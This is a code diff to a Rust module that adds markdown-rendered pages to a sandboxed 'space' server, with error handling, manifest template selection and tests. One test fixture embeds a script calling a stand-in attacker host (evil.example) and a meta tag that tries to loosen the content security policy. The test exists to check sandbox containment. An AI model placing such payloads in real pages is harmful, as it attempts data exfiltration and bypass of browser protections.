@@ -1,7 +1,9 @@
 //! The space model — a directory of files becomes a live, safely-served space
 //! (Wave 2a / Phase 2). Production, security-sensitive code.
 //!
-//! A **space** is a directory of artifacts (`.html`) plus first-class `assets/`.
+//! A **space** is a directory of artifacts (`.html` served verbatim, and — the
+//! markdown-native path — `.md`/`.markdown` rendered server-side through a built-in
+//! template into an artifact body) plus first-class `assets/`.
 //! `scan_dir` reads the whole tree into an **immutable in-memory snapshot**;
 //! `ArtifactHost` swaps snapshots atomically (a half-written file is never served
 //! — reads see either the fully-old or the fully-new snapshot, never a partial
@@ -24,6 +26,7 @@ use std::fmt;
 use std::io::Read;
 use std::path::{Component, Path, PathBuf};
 
+use super::render::{self, BUILTIN_NAMES};
 use super::{RESERVED, valid_name};
 
 /// Per-file byte ceiling. A single artifact/asset larger than this is a hard
@@ -126,6 +129,17 @@ pub enum ScanError {
     NotUtf8(PathBuf),
     BadAssetName(PathBuf),
     Manifest(PathBuf, String),
+    /// The manifest's `template:` named something that is not a built-in template
+    /// (markdown-native spaces select the template by built-in name, `prose` or
+    /// `dashboard`; a fully custom template is authored via single-file `render`).
+    UnknownTemplate(String),
+    /// Rendering a `.md` page through its template produced a body over the
+    /// per-file cap (markup can amplify a small markdown source).
+    RenderTooLarge(PathBuf, u64),
+    /// The resolved template could not splice the rendered markdown (a template
+    /// missing / duplicating its `{{content}}` slot). Built-in templates never hit
+    /// this; the variant keeps the render seam's error surfaced rather than panicked.
+    TemplateRender(PathBuf, String),
 }
 
 impl fmt::Display for ScanError {
@@ -201,6 +215,22 @@ impl fmt::Display for ScanError {
                 p.display()
             ),
             ScanError::Manifest(p, e) => write!(f, "cannot parse {}: {e}", p.display()),
+            ScanError::UnknownTemplate(name) => write!(
+                f,
+                "unknown template {name:?} in {MANIFEST_FILE}: a markdown-native space selects a \
+                 built-in template by name (expected one of: {}). For a fully custom template, \
+                 pre-render the page to .html or use `glasspad render <file.md> --template <path>`",
+                BUILTIN_NAMES.join(", ")
+            ),
+            ScanError::RenderTooLarge(p, n) => write!(
+                f,
+                "rendering {} produced {n} bytes, over the {MAX_FILE_BYTES}-byte per-file limit \
+                 (markdown can amplify into much larger markup)",
+                p.display()
+            ),
+            ScanError::TemplateRender(p, e) => {
+                write!(f, "cannot render {}: {e}", p.display())
+            }
         }
     }
 }
@@ -436,6 +466,15 @@ pub fn scan_dir(root: &Path) -> Result<Space, ScanError> {
 
     let mut space = Space::default();
     let mut total: u64 = 0;
+    // The manifest's `template:` (built-in name), resolved once after the scan so a
+    // `.md` file that sorts *before* `glasspad.yaml` still renders with the chosen
+    // template. `None` → the `prose` default.
+    let mut template_ref: Option<String> = None;
+    // `.md`/`.markdown` pages are buffered raw during the scan and rendered *after*
+    // the whole directory is read — so the template (from the manifest, which may
+    // appear anywhere in sort order) is known, and a `.md`↔`.html` stem collision is
+    // detected against the fully-populated `.html` artifact set.
+    let mut pending_md: Vec<(String, String, PathBuf)> = Vec::new();
 
     // --- top-level entries: *.html artifacts, assets/ dir, manifest ---------
     let mut entries: Vec<_> = std::fs::read_dir(&root)
@@ -477,7 +516,30 @@ pub fn scan_dir(root: &Path) -> Result<Space, ScanError> {
                 return Err(ScanError::ManifestTooLarge(path.clone(), raw.len() as u64));
             }
             let text = String::from_utf8(raw).map_err(|_| ScanError::NotUtf8(path.clone()))?;
-            apply_manifest(&text, &path, &mut space)?;
+            apply_manifest(&text, &path, &mut space, &mut template_ref)?;
+            continue;
+        }
+
+        // Markdown pages: buffer the raw source now, render after the scan (slug =
+        // filename stem). Grammar/reserved are checked here (cheap, early); the
+        // collision + entry-cap + render happen post-loop once every `.html` slug and
+        // the template are known.
+        if let Some(stem) = md_stem(name) {
+            if RESERVED.contains(&stem) {
+                return Err(ScanError::ReservedSlug(stem.to_string(), path.clone()));
+            }
+            if !valid_name(stem) {
+                return Err(ScanError::BadSlug(stem.to_string(), path.clone()));
+            }
+            if space.artifacts.len() + space.assets.len() + pending_md.len() >= MAX_ENTRIES {
+                return Err(ScanError::TooManyEntries(
+                    space.artifacts.len() + space.assets.len() + pending_md.len() + 1,
+                ));
+            }
+            ensure_within(&canon_root, &path)?;
+            let raw = read_file_capped(&path, &mut total)?;
+            let md = String::from_utf8(raw).map_err(|_| ScanError::NotUtf8(path.clone()))?;
+            pending_md.push((stem.to_string(), md, path.clone()));
             continue;
         }
 
@@ -505,7 +567,32 @@ pub fn scan_dir(root: &Path) -> Result<Space, ScanError> {
                 .artifacts
                 .insert(stem.to_string(), Artifact { html, title });
         }
-        // Non-.html, non-manifest top-level files are ignored (assets live in assets/).
+        // Non-.html/.md, non-manifest top-level files are ignored (assets live in assets/).
+    }
+
+    // --- render buffered markdown pages through the resolved template -------
+    // The template is a built-in fragment (`prose` default, or `dashboard`), so the
+    // rendered body flows through the SAME serve path as an `.html` artifact: the
+    // content route sets the frozen CSP/sandbox headers on the response, and
+    // `wrap::render_artifact` wraps the fragment (base.css + bridge.js). A template
+    // governs only the body — it can never widen the boundary or reach the shell.
+    if !pending_md.is_empty() {
+        let template = resolve_space_template(template_ref.as_deref())?;
+        for (stem, md, path) in pending_md {
+            // Collision against an `.html` artifact of the same stem, or another `.md`
+            // page — never silently resolved (mirrors the `.html`/`.htm` collision).
+            if space.artifacts.contains_key(&stem) {
+                return Err(ScanError::DuplicateSlug(stem, path));
+            }
+            let body = render::render_to_body(&md, template)
+                .map_err(|e| ScanError::TemplateRender(path.clone(), e.to_string()))?;
+            let len = body.len() as u64;
+            if len > MAX_FILE_BYTES {
+                return Err(ScanError::RenderTooLarge(path, len));
+            }
+            let title = resolve_title(&body).unwrap_or_else(|| stem.clone());
+            space.artifacts.insert(stem, Artifact { html: body, title });
+        }
     }
 
     if total > MAX_SPACE_BYTES {
@@ -514,6 +601,16 @@ pub fn scan_dir(root: &Path) -> Result<Space, ScanError> {
 
     finalize(&mut space);
     Ok(space)
+}
+
+/// Resolve a markdown-native space's template selection (the manifest `template:`
+/// field, default `prose`) to its built-in HTML fragment. Only built-in names are
+/// accepted — the single-file `render` seam owns fully custom / file-path templates;
+/// a `.md` space picks a reading theme by name, per-space. An unknown name is a hard
+/// error (informative, with the allowlist), never a silent fallback.
+fn resolve_space_template(reference: Option<&str>) -> Result<&'static str, ScanError> {
+    let name = reference.unwrap_or(render::DEFAULT_TEMPLATE);
+    render::builtin_template(name).ok_or_else(|| ScanError::UnknownTemplate(name.to_string()))
 }
 
 /// Recursively scan the `assets/` subtree into `space.assets`, keyed by the
@@ -684,18 +781,34 @@ fn finalize(space: &mut Space) {
     };
 }
 
-/// Parse the optional `glasspad.yaml` — **structure only** (title, nav order).
-/// Unknown keys are ignored; a syntactically invalid file is a hard error.
-fn apply_manifest(text: &str, path: &Path, space: &mut Space) -> Result<(), ScanError> {
+/// Parse the optional `glasspad.yaml` — **structure only** (title, nav order, and —
+/// for markdown-native spaces — the built-in `template` name applied to `.md` pages).
+/// Unknown keys are ignored; a syntactically invalid file is a hard error. The
+/// resolved `template:` string is written to `template_ref` (validated later, once,
+/// by [`resolve_space_template`]).
+fn apply_manifest(
+    text: &str,
+    path: &Path,
+    space: &mut Space,
+    template_ref: &mut Option<String>,
+) -> Result<(), ScanError> {
     #[derive(serde::Deserialize, Default)]
     struct Manifest {
         #[serde(default)]
         title: Option<String>,
         #[serde(default)]
         nav: Vec<String>,
+        #[serde(default)]
+        template: Option<String>,
     }
     let m: Manifest = serde_yaml::from_str(text)
         .map_err(|e| ScanError::Manifest(path.to_path_buf(), e.to_string()))?;
+    if let Some(t) = m.template {
+        let t = t.trim();
+        if !t.is_empty() {
+            *template_ref = Some(t.to_string());
+        }
+    }
     if let Some(t) = m.title {
         let t = strip_unsafe_display_chars(&decode_entities(t.trim()));
         let t = t.trim();
@@ -713,6 +826,20 @@ fn html_stem(name: &str) -> Option<&str> {
     for ext in [".html", ".htm"] {
         if let Some(stem) = name.strip_suffix(ext) {
             return Some(stem);
+        }
+    }
+    None
+}
+
+/// The `.md`/`.markdown` filename stem, or `None` for non-markdown files — the
+/// markdown-native-space counterpart of [`html_stem`]. The match is
+/// case-insensitive on the extension (`README.MD` is markdown too); the stem itself
+/// is returned unchanged and validated against the slug grammar by the caller.
+fn md_stem(name: &str) -> Option<&str> {
+    let lower = name.to_ascii_lowercase();
+    for ext in [".md", ".markdown"] {
+        if lower.ends_with(ext) {
+            return Some(&name[..name.len() - ext.len()]);
         }
     }
     None
@@ -1229,6 +1356,32 @@ mod tests {
         assert_eq!(html_stem("noext"), None);
     }
 
+    #[test]
+    fn md_stem_matches_markdown_extensions_case_insensitively() {
+        assert_eq!(md_stem("index.md"), Some("index"));
+        assert_eq!(md_stem("guide.markdown"), Some("guide"));
+        assert_eq!(md_stem("README.MD"), Some("README")); // stem unchanged; caller validates
+        assert_eq!(md_stem("a.html"), None);
+        assert_eq!(md_stem("data.json"), None);
+        assert_eq!(md_stem("noext"), None);
+    }
+
+    #[test]
+    fn resolve_space_template_defaults_to_prose_and_rejects_unknown() {
+        assert_eq!(
+            resolve_space_template(None).unwrap(),
+            render::builtin_template("prose").unwrap()
+        );
+        assert_eq!(
+            resolve_space_template(Some("dashboard")).unwrap(),
+            render::builtin_template("dashboard").unwrap()
+        );
+        assert!(matches!(
+            resolve_space_template(Some("nope")),
+            Err(ScanError::UnknownTemplate(_))
+        ));
+    }
+
     // --- bundle builder (hosted space ingest) ------------------------------
 
     fn page(slug: &str, html: &str) -> BundlePage {
@@ -1510,6 +1663,210 @@ mod fs_tests {
         d.write("glasspad.yaml", b"nav: [a, a, b, a]\n");
         let space = scan_dir(d.path()).unwrap();
         assert_eq!(space.nav, vec!["a".to_string(), "b".to_string()]);
+    }
+
+    // --- markdown-native spaces (Gap 2) ------------------------------------
+
+    #[test]
+    fn markdown_dir_renders_each_md_as_an_artifact_with_stem_slug() {
+        let d = TempDir::new();
+        d.write("index.md", b"# Home\n\nWelcome to the [guide](./guide).\n");
+        d.write("guide.md", b"# The Guide\n\nSome **bold** prose.\n");
+        let space = scan_dir(d.path()).unwrap();
+
+        assert_eq!(space.artifacts.len(), 2);
+        // Slug is the filename stem; nav is lexicographic without a manifest.
+        assert_eq!(space.nav, vec!["guide".to_string(), "index".to_string()]);
+        assert_eq!(space.home.as_deref(), Some("index"));
+
+        let index = space.artifact("index").unwrap();
+        // Rendered through the default `prose` fragment template (base.css hardened
+        // reading theme), so it is a fragment the serve path wraps + bridges.
+        assert!(index.html.contains(r#"<article class="gp-prose">"#));
+        assert!(index.html.contains("<h1>Home</h1>"));
+        // The relative markdown link survives so same-space nav resolves.
+        assert!(index.html.contains(r#"href="./guide""#));
+        // Title resolves from the rendered first <h1>.
+        assert_eq!(index.title, "Home");
+        assert_eq!(space.artifact("guide").unwrap().title, "The Guide");
+        assert!(
+            space
+                .artifact("guide")
+                .unwrap()
+                .html
+                .contains("<strong>bold</strong>")
+        );
+    }
+
+    #[test]
+    fn markdown_and_html_coexist_in_one_space() {
+        let d = TempDir::new();
+        d.write("index.html", b"<title>Home</title><h1>hi</h1>");
+        d.write("about.md", b"# About Us\n\nprose.\n");
+        d.write("assets/data.json", b"{\"a\":1}");
+        let space = scan_dir(d.path()).unwrap();
+
+        assert_eq!(space.artifacts.len(), 2);
+        // The `.html` page is served byte-for-byte verbatim (not wrapped at scan).
+        assert_eq!(
+            space.artifact("index").unwrap().html,
+            "<title>Home</title><h1>hi</h1>"
+        );
+        // The `.md` page is rendered.
+        assert!(
+            space
+                .artifact("about")
+                .unwrap()
+                .html
+                .contains("<h1>About Us</h1>")
+        );
+        assert!(space.asset("assets/data.json").is_some());
+        assert_eq!(space.home.as_deref(), Some("index"));
+    }
+
+    #[test]
+    fn markdown_and_html_same_stem_is_a_collision() {
+        let d = TempDir::new();
+        d.write("page.html", b"<h1>html</h1>");
+        d.write("page.md", b"# markdown\n");
+        assert!(matches!(
+            scan_dir(d.path()),
+            Err(ScanError::DuplicateSlug(_, _))
+        ));
+    }
+
+    #[test]
+    fn two_markdown_files_same_stem_is_a_collision() {
+        let d = TempDir::new();
+        d.write("page.md", b"# one\n");
+        d.write("page.markdown", b"# two\n");
+        assert!(matches!(
+            scan_dir(d.path()),
+            Err(ScanError::DuplicateSlug(_, _))
+        ));
+    }
+
+    #[test]
+    fn manifest_template_selects_the_builtin_for_md_pages() {
+        let d = TempDir::new();
+        d.write("index.md", b"# Dash\n");
+        d.write("glasspad.yaml", b"template: dashboard\n");
+        let space = scan_dir(d.path()).unwrap();
+        // `dashboard` wraps in a `.gp-card` surface instead of `.gp-prose`.
+        assert!(
+            space
+                .artifact("index")
+                .unwrap()
+                .html
+                .contains(r#"class="gp-card""#)
+        );
+        assert!(!space.artifact("index").unwrap().html.contains("gp-prose"));
+    }
+
+    #[test]
+    fn manifest_template_orders_and_resolves_regardless_of_scan_order() {
+        // `about.md` sorts before `glasspad.yaml`; the template must still apply.
+        let d = TempDir::new();
+        d.write("about.md", b"# About\n");
+        d.write("glasspad.yaml", b"template: dashboard\nnav: [about]\n");
+        let space = scan_dir(d.path()).unwrap();
+        assert!(
+            space
+                .artifact("about")
+                .unwrap()
+                .html
+                .contains(r#"class="gp-card""#)
+        );
+    }
+
+    #[test]
+    fn unknown_manifest_template_is_a_hard_error() {
+        let d = TempDir::new();
+        d.write("index.md", b"# Hi\n");
+        d.write("glasspad.yaml", b"template: nonsuch\n");
+        assert!(matches!(
+            scan_dir(d.path()),
+            Err(ScanError::UnknownTemplate(_))
+        ));
+    }
+
+    #[test]
+    fn reserved_and_bad_md_slugs_are_hard_errors() {
+        let d = TempDir::new();
+        d.write("api.md", b"# x\n"); // `api` is reserved
+        assert!(matches!(
+            scan_dir(d.path()),
+            Err(ScanError::ReservedSlug(_, _))
+        ));
+        let d2 = TempDir::new();
+        d2.write("Bad Name.md", b"# x\n");
+        assert!(matches!(scan_dir(d2.path()), Err(ScanError::BadSlug(_, _))));
+    }
+
+    #[test]
+    fn hostile_markdown_passes_through_as_inert_sandboxed_body() {
+        // Raw HTML/script embedded in markdown passes through verbatim — it is
+        // untrusted script inside the null-origin sandbox regardless, and the body
+        // stays a fragment (no full-document boundary escape). The security boundary
+        // is the CSP/sandbox on the RESPONSE, not sanitization here.
+        let d = TempDir::new();
+        d.write(
+            "index.md",
+            b"# Doc\n\n<script>fetch('http://evil.example/x')</script>\n\
+              <meta http-equiv=\"Content-Security-Policy\" content=\"connect-src *\">\n",
+        );
+        let space = scan_dir(d.path()).unwrap();
+        let body = &space.artifact("index").unwrap().html;
+        // The rendered body is a fragment (wrap injects base.css + bridge.js at serve).
+        assert!(super::super::wrap::is_fragment(body));
+        // The script text is present but inert — it only ever runs inside the frozen
+        // sandbox, and `connect-src 'none'` (set on the response) blocks the fetch.
+        assert!(body.contains("evil.example"));
+        assert!(body.contains(r#"<article class="gp-prose">"#));
+    }
+
+    #[test]
+    fn oversize_md_source_is_a_hard_error() {
+        // A markdown source over the per-file cap is rejected on read (same cap the
+        // `.html` path enforces), before any render.
+        let d = TempDir::new();
+        d.write("index.md", &vec![b'a'; (MAX_FILE_BYTES + 1) as usize]);
+        assert!(matches!(
+            scan_dir(d.path()),
+            Err(ScanError::FileTooLarge(_, _))
+        ));
+    }
+
+    #[test]
+    fn md_space_scan_feeds_the_hosted_bundle_builder() {
+        // The hosted space-publish path scans locally, then ships the rendered
+        // artifact bodies to `build_space_bundle` (which re-validates them). Prove the
+        // md-rendered bodies flow through that builder unchanged (same multi-page
+        // hosted result an `.html` space produces).
+        let d = TempDir::new();
+        d.write("index.md", b"# Home\n\n[guide](./guide)\n");
+        d.write("guide.md", b"# Guide\n");
+        let space = scan_dir(d.path()).unwrap();
+
+        let pages: Vec<BundlePage> = space
+            .artifacts
+            .iter()
+            .map(|(slug, art)| BundlePage {
+                slug: slug.clone(),
+                html: art.html.clone(),
+            })
+            .collect();
+        let bundle =
+            build_space_bundle(pages, vec![], space.nav.clone(), space.title.clone()).unwrap();
+        assert_eq!(bundle.artifacts.len(), 2);
+        assert!(
+            bundle
+                .artifact("index")
+                .unwrap()
+                .html
+                .contains("<h1>Home</h1>")
+        );
+        assert_eq!(bundle.artifact("guide").unwrap().title, "Guide");
     }
 
     #[cfg(unix)]
